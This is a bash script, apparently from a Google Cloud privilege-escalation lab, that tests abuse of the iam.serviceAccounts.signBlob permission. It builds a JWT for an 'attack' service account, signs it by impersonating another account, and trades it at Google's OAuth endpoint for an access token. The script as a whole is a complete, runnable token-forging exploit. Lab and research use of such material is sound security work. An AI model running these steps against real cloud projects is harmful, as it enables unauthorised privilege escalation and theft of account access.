#!/bin/bash

source lib/lib.sh

echo "================================================"
echo "Checking iam.serviceAccounts.signBlob"

modify_role "iam.serviceAccounts.signBlob"

HEADER=$(echo -n '{"alg":"RS256","typ":"JWT"}' | base64 | tr '/+' '_-' | tr -d '=')
JWT_BODY=$(echo -n "{\"iss\":\"${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com\",\"scope\":\"https://www.googleapis.com/auth/iam https://www.googleapis.com/auth/cloud-platform\",\"aud\":\"https://accounts.google.com/o/oauth2/token\",\"exp\":$(( `date +%s` + 3600)),\"iat\":$(date +%s)}" | base64 | tr '/+' '_-' | tr -d '=')

echo -n "$HEADER.$JWT_BODY" > /tmp/input.bin

gcloud --impersonate-service-account="${SERVICE_ACCOUNT_ID}@${PROJECT_ID}.iam.gserviceaccount.com" \
  iam service-accounts sign-blob --iam-account="${ATTACK_SA}@${PROJECT_ID}.iam.gserviceaccount.com" /tmp/input.bin /tmp/output.bin

SIGNATURE=$(base64 /tmp/output.bin | tr '/+' '_-' | tr -d '=')
JWT_SIGNED="$HEADER.$JWT_BODY.$SIGNATURE"

curl "https://accounts.google.com/o/oauth2/token"\
  -d "grant_type=assertion&assertion_type=http://oauth.net/grant_type/jwt/1.0/bearer&assertion=$JWT_SIGNED" \
  -H "Content-type: application/x-www-form-urlencoded"

echo ""

# Cleaning
echo "You should see a token previous to this message"
read -p "Press any key to delete scenario... " -n1 -s
echo ""

rm /tmp/input.bin /tmp/output.bin

echo "================================================"
